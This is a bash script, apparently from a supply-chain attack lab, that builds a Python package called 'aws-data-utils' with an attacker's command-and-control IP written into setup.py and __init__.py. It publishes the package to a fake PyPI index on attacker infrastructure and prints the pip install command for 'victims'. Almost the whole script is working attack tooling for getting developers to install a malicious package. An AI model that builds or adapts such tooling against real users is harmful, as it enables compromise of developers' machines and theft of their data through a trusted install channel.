#!/bin/bash
# Build malicious package and upload to attacker's PyPI server

set -e

if [ -z "$1" ]; then
    echo "Usage: $0 <C2_SERVER_IP>"
    echo "Example: $0 192.168.1.100"
    exit 1
fi

C2_IP="$1"
DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd )"
cd "$DIR"

echo "=========================================="
echo "  Building Malicious Package"
echo "=========================================="
echo ""
echo "[*] Target C2 Server: $C2_IP"
echo ""

# Replace C2 IP in setup.py
echo "[*] Configuring C2 server IP in setup.py..."
sed -i.bak "s/REPLACE_WITH_C2_IP/$C2_IP/g" setup.py
sed -i.bak "s/REPLACE_WITH_C2_IP/$C2_IP/g" aws_data_utils/__init__.py

# Build package with C2 IP embedded
echo "[*] Building package with C2 IP embedded..."
python3 setup.py sdist bdist_wheel 2>&1 | grep -v "warning:" || true

# IMPORTANT: Do NOT restore originals yet - they're needed for the tarball
# Restore will happen after upload

# Create PyPI simple index structure
echo "[*] Creating PyPI index structure..."
PYPI_DIR="../1-attacker-infrastructure/packages"
SIMPLE_DIR="$PYPI_DIR/simple"
PKG_DIR="$SIMPLE_DIR/aws-data-utils"

mkdir -p "$PKG_DIR"

# Copy built package
echo "[*] Uploading package to PyPI server..."

# Check if files exist before copying
# Note: setuptools converts hyphens to underscores in filenames
TARGZ_COUNT=$(ls dist/aws_data_utils-*.tar.gz 2>/dev/null | wc -l)
if [ "$TARGZ_COUNT" -eq 0 ]; then
    echo "[-] ERROR: tar.gz file not found in dist/"
    echo "    Build may have failed. Check output above."
    ls -la dist/
    exit 1
fi

echo "[+] Found tar.gz file in dist/"

# Copy with verbose output and check success
echo "[*] Copying source distribution (tar.gz)..."
cp -v dist/aws_data_utils-*.tar.gz "$PKG_DIR/" || {
    echo "[-] ERROR: Failed to copy tar.gz to $PKG_DIR"
    exit 1
}

echo "[*] Copying wheel..."
cp -v dist/aws_data_utils-*.whl "$PKG_DIR/" 2>/dev/null || {
    echo "[!] Warning: Wheel copy failed (may not exist)"
}

# Verify files were copied
echo "[*] Verifying uploaded files..."
ls -la "$PKG_DIR/"

# Create index.html for the package
cat > "$PKG_DIR/index.html" << EOF
<!DOCTYPE html>
<html>
<head><title>Links for aws-data-utils</title></head>
<body>
<h1>Links for aws-data-utils</h1>
EOF

for file in "$PKG_DIR"/*.tar.gz "$PKG_DIR"/*.whl; do
    if [ -f "$file" ]; then
        filename=$(basename "$file")
        echo "<a href=\"$filename\">$filename</a><br/>" >> "$PKG_DIR/index.html"
    fi
done

echo "</body></html>" >> "$PKG_DIR/index.html"

# Now restore original files (after tarball is created and uploaded)
echo "[*] Restoring original configuration files..."
mv setup.py.bak setup.py 2>/dev/null || true
mv aws_data_utils/__init__.py.bak aws_data_utils/__init__.py 2>/dev/null || true

# Create main simple index
cat > "$SIMPLE_DIR/index.html" << EOF
<!DOCTYPE html>
<html>
<head><title>Simple Index</title></head>
<body>
<h1>Simple Index</h1>
<a href="aws-data-utils/">aws-data-utils</a><br/>
</body>
</html>
EOF

echo ""
echo "[SUCCESS] Package built and uploaded!"
echo ""
echo "Package available at:"
echo "  http://$C2_IP:8080/simple/aws-data-utils/"
echo ""
echo "Victims can install with:"
echo "  pip install --index-url http://$C2_IP:8080/simple/ aws-data-utils"
echo ""
